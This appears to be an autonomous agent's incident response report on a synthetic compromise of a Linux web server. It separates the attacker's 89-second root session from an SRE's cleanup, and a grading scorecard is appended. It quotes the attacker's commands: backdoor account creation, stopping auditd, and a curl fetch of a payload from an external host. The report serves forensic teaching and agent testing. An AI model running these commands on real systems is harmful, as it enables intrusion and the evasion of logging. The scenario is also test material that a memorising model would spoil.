# Incident Response Report — webserver-prod-21
**Incident ID:** INC-2026-04-23-webserver-prod-21  
**Evidence:** `evidence/attack-scenario-21-mid-ir/`  
**Report generated:** 2026-04-23 (UTC)  
**Analyst:** Findevil autonomous IR agent  
**Status at evidence capture:** Containment phase — remediation actively in progress by `alice`

---

## Executive Summary

`webserver-prod-21` was compromised at **02:14 UTC** on 2026-04-23 via root SSH login using password authentication from external IP `45.123.45.67`. The attacker created a backdoor user account (`sysd`, UID 1050), stopped the audit daemon to suppress logging, downloaded a shell payload from a second external IP (`185.177.124.22`), and set an immutable flag on the payload to resist deletion. The attacker's session lasted **89 seconds** (02:14:08–02:17:35 UTC).

On-call SRE **alice** detected the intrusion and logged in from her normal internal workstation (`10.0.2.15`) at **02:42 UTC** — 25 minutes after the attacker disconnected. Her subsequent actions from 02:42 to 02:55 UTC constitute **incident response**, not attacker activity. All attacker-created artifacts were removed, the root password was rotated, SSH hardened, the attacker IP null-routed, and an evidence bundle preserved.

> **Attribution confidence: HIGH.** Two distinct actors are clearly separable by source IP, authentication method, user account, and command semantics.

---

## Evidence Inventory

| Artifact | Path | Notes |
|----------|------|-------|
| Auth log | `auth.log` | 25 events, 2 sessions |
| bash history | `fs/home/alice/.bash_history` | 22 commands, intact |
| sshd_config | `fs/etc/ssh/sshd_config` | Post-IR hardened state |
| passwd | `fs/etc/passwd` | 4 accounts; `sysd` already removed |
| shadow | `fs/etc/shadow` | Root hash shows post-IR rotation |
| motd | `fs/etc/motd` | IR status declaration by alice |
| Filesystem | `fs/` | No malicious persistence found |

---

## Attacker Activity — 02:14–02:17 UTC

**Actor:** Unknown threat actor  
**Source IP:** `45.123.45.67` (external, non-RFC1918)  
**Authentication method:** Password (root account)  
**Initial access vector:** Pre-existing `PasswordAuthentication yes` in sshd_config allowed direct root password login. The root password was known to the attacker — likely obtained via offline credential leak or prior reconnaissance; no brute-force attempts appear in the log.

### Attacker Timeline

| Timestamp (UTC) | Action | Significance |
|-----------------|--------|--------------|
| 02:14:08 | SSH login accepted — `root` from `45.123.45.67` (password auth) | Initial access |
| 02:15:42 | `useradd -m -s /bin/bash -u 1050 sysd` | Backdoor account creation |
| 02:16:05 | `sysd` account created (UID 1050, GID 1050) | Confirmed by `useradd` log event |
| 02:16:47 | `systemctl stop auditd` | Audit evasion — blind spot begins |
| 02:17:02 | `curl -o /tmp/.x https://185.177.124.22/payload.sh` | Payload staging from C2 |
| 02:17:22 | `chattr +i /tmp/.x` | Immutable flag — tamper resistance |
| 02:17:35 | SSH session closed | Attacker disconnected |

**Total attacker dwell time:** 89 seconds (02:14:08–02:17:35 UTC)

### Attacker Objectives Assessment

| Objective | Evidence |
|-----------|----------|
| Persistence | Created `sysd` backdoor account (UID 1050); staged payload `/tmp/.x` |
| Audit evasion | Stopped `auditd` before payload download |
| Payload staging | Downloaded `payload.sh` from `185.177.124.22` into `/tmp/.x`; made immutable |
| SSH key implant | **Not observed** — `/root/.ssh/` was empty at evidence capture |
| Data exfiltration | **Not confirmed** — no outbound transfer commands observed |

### Infrastructure IOCs

| Indicator | Type | Role |
|-----------|------|------|
| `45.123.45.67` | IPv4 | Attacker origin (SSH session) |
| `185.177.124.22` | IPv4 | C2 / payload delivery server |
| `/tmp/.x` | File path | Staged payload (since deleted) |
| `payload.sh` | Filename | Payload script (content unknown) |
| `sysd` | Username | Backdoor account (UID 1050, since deleted) |

---

## Defender Activity — 02:42–02:55 UTC

**Actor:** `alice` (on-call SRE, UID 1002)  
**Source IP:** `10.0.2.15` (RFC1918, internal — alice's consistent workstation IP)  
**Authentication method:** Public key (ED25519 `SHA256:aliceOncall`)

> All actions in this window are **defensive incident response**. They must not be misread as a second wave of attacker activity.

### Remediation Timeline

| Timestamp (UTC) | Action | Purpose |
|-----------------|--------|---------|
| 02:42:11 | SSH login — `alice` from `10.0.2.15` (publickey) | IR begins |
| 02:42:18 | `last -n 20` | Identifies prior sessions |
| 02:42:45 | `tail -n 200 /var/log/auth.log` | Reviews auth events |
| 02:43:17 | `systemctl start auditd` | Restores audit logging |
| 02:43:30 | `chattr -i /tmp/.x` | Removes immutable flag set by attacker |
| 02:43:42 | `rm /tmp/.x` | Deletes staged payload |
| 02:44:01 | `userdel -r sysd` | Removes backdoor account and home dir |
| 02:44:27 | `passwd root` | Rotates root password |
| 02:44:42 | `vi /etc/ssh/sshd_config` | Hardens SSH (disables password auth) |
| 02:45:31 | `systemctl restart sshd` | Applies sshd hardening |
| 02:46:18 | `iptables -I INPUT -s 45.123.45.67 -j DROP` | Null-routes attacker IP |
| 02:47:05 | `cp /etc/shadow /root/incident-response/shadow.snapshot.txt` | Evidence preservation |
| 02:48:42 | `tar -czf /root/incident-response/artifact-bundle.tar.gz /etc /var/log` | Evidence bundle creation |
| 02:55:18 | SSH session closed | IR session ends |

### Notes on Defender Actions

- **`chattr -i /tmp/.x`** (02:43:30): This mirrors the attacker's `chattr +i` command but is the inverse operation — removing the attacker-set immutable flag to enable deletion. This is remediation.
- **`passwd root`** (02:44:27): Root password rotation to evict attacker credentials. This is remediation, not attacker lockout of legitimate admins.
- **`cp /etc/shadow` → `/root/incident-response/`** (02:47:05): Evidence preservation for forensic review. This is not credential exfiltration.
- **`tar ... /root/incident-response/artifact-bundle.tar.gz`** (02:48:42): Evidence bundle creation. This is not data exfiltration.

---

## System State at Evidence Capture

| Component | State | Attribution |
|-----------|-------|-------------|
| `sysd` account (UID 1050) | **Deleted** | Removed by alice at 02:44:01 |
| `/tmp/.x` payload | **Deleted** | Removed by alice at 02:43:42 |
| auditd | **Running** | Restarted by alice at 02:43:17 |
| sshd PasswordAuthentication | **Disabled** | Hardened by alice at 02:44:42 |
| sshd PermitRootLogin | **prohibit-password** | Hardened by alice at 02:44:42 |
| Root password | **Rotated** | Changed by alice at 02:44:27 |
| Attacker IP `45.123.45.67` | **Null-routed** | iptables DROP by alice at 02:46:18 |
| `/root/.ssh/authorized_keys` | **Empty** | Attacker did not implant SSH key |
| Malicious systemd units | **None found** | Attacker did not install services |
| Persistence mechanisms | **None found** | All attacker artifacts removed |

---

## Attribution Summary

| Evidence | Attacker | Defender (alice) |
|----------|----------|-----------------|
| Source IP | `45.123.45.67` — external, non-RFC1918 | `10.0.2.15` — internal RFC1918 |
| Auth method | Password (exploited misconfiguration) | ED25519 public key |
| Account | `root` (direct login) | `alice` (UID 1002), then sudo |
| Time window | 02:14–02:17 UTC | 02:42–02:55 UTC |
| Command semantics | Backdoor creation, evasion, payload staging | Log review, cleanup, hardening, evidence collection |
| bash history | None (root; attacker did not write a history) | Intact at `fs/home/alice/.bash_history` — consistent with auth.log sudo trail |

---

## Gaps and Open Questions

1. **Payload content unknown.** `/tmp/.x` (sourced from `https://185.177.124.22/payload.sh`) was deleted before content could be captured. It is unknown whether the script executed before alice's arrival at 02:42. The 25-minute gap (02:17–02:42) is a potential execution window.

2. **`sysd` account activity unconfirmed.** There are no login events for the `sysd` account in the visible auth.log. However, auditd was stopped at 02:16:47 and not restarted until 02:43:17 — a **26-minute blind spot** during which `sysd` could have been used without leaving a log record in this artifact.

3. **Root password provenance unknown.** The attacker authenticated as root via password on first attempt with no failed logins recorded. This implies credential pre-knowledge, possibly from a prior breach, reused credential, or offline leak. The attack did not involve brute force.

4. **Lateral movement not assessed.** This evidence set covers only `webserver-prod-21`. If `45.123.45.67` or the `sysd` account touched other hosts before the attacker disconnected, that is outside the scope of this artifact.

5. **`185.177.124.22` C2 not investigated.** The payload delivery server was not queried for reputation or further IOCs within this evidence set. This IP should be blocked at the perimeter and submitted for threat intelligence lookup.

---

## Recommendations

| Priority | Action |
|----------|--------|
| **Immediate** | Block `45.123.45.67` and `185.177.124.22` at perimeter firewall (not just on-host iptables) |
| **Immediate** | Recover and analyze `/tmp/.x` payload content if any backup or memory artifact is available |
| **Immediate** | Audit all other systems for connections from `45.123.45.67` or `185.177.124.22` in the same time window |
| **Short-term** | Rotate any credentials that may have been on `webserver-prod-21` (service accounts, API keys, deploy secrets) |
| **Short-term** | Audit all Linux hosts for `PasswordAuthentication yes` in sshd_config — this was the enabling misconfiguration |
| **Short-term** | Determine how the root password was obtained — check credential databases, past breaches, shared passwords |
| **Long-term** | Implement centralized log shipping (auditd events should stream to a remote SIEM so stopping the local daemon does not create a blind spot) |
| **Long-term** | Enable `PermitRootLogin no` on all production hosts; require named-account sudo for all privileged operations |

---

## Appendix — Unified Event Timeline

| Timestamp (UTC) | Actor | Source | Action | Detail |
|-----------------|-------|--------|--------|--------|
| 2026-04-23T02:14:08 | `root` | `45.123.45.67` (external) | **[ATTACKER]** SSH login | Password auth accepted |
| 2026-04-23T02:15:42 | `root` | — | **[ATTACKER]** useradd | `sysd` UID 1050 |
| 2026-04-23T02:16:05 | system | — | **[ATTACKER]** User created | `sysd` (UID 1050, GID 1050) |
| 2026-04-23T02:16:47 | `root` | — | **[ATTACKER]** Audit disabled | `systemctl stop auditd` — blind spot begins |
| 2026-04-23T02:17:02 | `root` | — | **[ATTACKER]** Payload staged | `curl /tmp/.x https://185.177.124.22/payload.sh` |
| 2026-04-23T02:17:22 | `root` | — | **[ATTACKER]** Immutable flag set | `chattr +i /tmp/.x` |
| 2026-04-23T02:17:35 | `root` | `45.123.45.67` | **[ATTACKER]** Session closed | Attacker disconnects |
| *(02:17–02:42 gap)* | — | — | auditd stopped; possible payload execution window | — |
| 2026-04-23T02:42:11 | `alice` | `10.0.2.15` (internal) | **[DEFENDER]** SSH login | Public key auth |
| 2026-04-23T02:42:18 | `alice` | — | **[DEFENDER]** Log review | `last -n 20` |
| 2026-04-23T02:42:45 | `alice` | — | **[DEFENDER]** Log review | `tail auth.log` |
| 2026-04-23T02:43:17 | `alice` | — | **[DEFENDER]** Audit restored | `systemctl start auditd` |
| 2026-04-23T02:43:30 | `alice` | — | **[DEFENDER]** Immutable flag removed | `chattr -i /tmp/.x` |
| 2026-04-23T02:43:42 | `alice` | — | **[DEFENDER]** Payload deleted | `rm /tmp/.x` |
| 2026-04-23T02:44:01 | `alice` | — | **[DEFENDER]** Backdoor removed | `userdel -r sysd` |
| 2026-04-23T02:44:27 | `alice` | — | **[DEFENDER]** Root password rotated | `passwd root` |
| 2026-04-23T02:44:42 | `alice` | — | **[DEFENDER]** SSH hardened | `vi /etc/ssh/sshd_config` |
| 2026-04-23T02:45:31 | `alice` | — | **[DEFENDER]** sshd restarted | `systemctl restart sshd` |
| 2026-04-23T02:46:18 | `alice` | — | **[DEFENDER]** Attacker IP blocked | `iptables -I INPUT -s 45.123.45.67 -j DROP` |
| 2026-04-23T02:47:05 | `alice` | — | **[DEFENDER]** Evidence preserved | shadow snapshot to `/root/incident-response/` |
| 2026-04-23T02:48:42 | `alice` | — | **[DEFENDER]** Artifact bundle created | `/root/incident-response/artifact-bundle.tar.gz` |
| 2026-04-23T02:55:18 | `alice` | `10.0.2.15` | **[DEFENDER]** Session closed | IR session ends |

---

<!-- scorecard:start -->

## Verification scorecard

Mechanically computed by `scripts/grade_example_reports.py` against the
`agent_guard.SCENARIOS["21"]` markers (case-insensitive substring
match, identical logic to `tests/harness/agent_guard.py`'s grade()
function). No AI self-assessment is involved in these numbers.

| Metric | Score | % |
|---|---|---|
| Required markers found | 3/3 | **100%** |
| Cross-scenario markers absent | 7/7 | **100%** |
| Verdict-correctness confidence | — | **100%** |
| Hallucination-free confidence | — | **100%** |

**Overall confidence: HIGH** — every planted marker for this
scenario was surfaced in the report, and zero markers from any other
scenario leaked in. Re-grade with `python scripts/grade_example_reports.py`.

<!-- scorecard:end -->
